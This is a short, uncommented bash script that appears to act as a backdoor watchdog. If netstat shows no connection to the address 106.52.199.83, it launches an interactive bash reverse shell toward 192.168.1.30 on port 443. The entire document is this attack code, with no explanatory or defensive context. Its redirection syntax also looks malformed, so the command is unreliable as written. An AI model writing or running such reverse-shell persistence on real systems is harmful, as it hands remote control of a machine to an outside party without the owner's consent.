#!/bin/bash
if netstat -ano | grep -v grep | grep "106.52.199.83" > /dev/null
then
echo "OK" > /dev/null
else
bash -i /dev/tcp/192.168.1.30/443 0>&1
fi
